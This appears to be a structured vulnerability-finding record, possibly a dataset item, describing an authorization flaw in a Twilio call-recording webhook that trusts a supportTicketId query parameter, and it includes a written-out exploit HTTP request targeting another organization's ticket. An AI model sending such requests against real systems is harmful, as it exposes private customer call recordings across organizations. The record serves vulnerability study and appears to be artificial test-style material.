diagnosis: The endpoint verifies Twilio's HMAC signature on incoming webhooks, but attaches call audio recordings to supportTicketId passed directly in the query string without checking if the phone call caller or ticket belongs to the same customer. An attacker can set supportTicketId to other organizations' ticket IDs, attaching private phone call recordings to unauthorized customer support cases.
exploit_request:
POST /webhooks/twilio/call-recording?supportTicketId=tkt_private_financial_9812 HTTP/1.1
Host: api.callcenter.com
X-Twilio-Signature: valid_twilio_hmac_signature==
Content-Type: application/x-www-form-urlencoded

CallSid=CA1234567890abcdef&RecordingUrl=https://api.twilio.com/recordings/RE1234&Duration=120
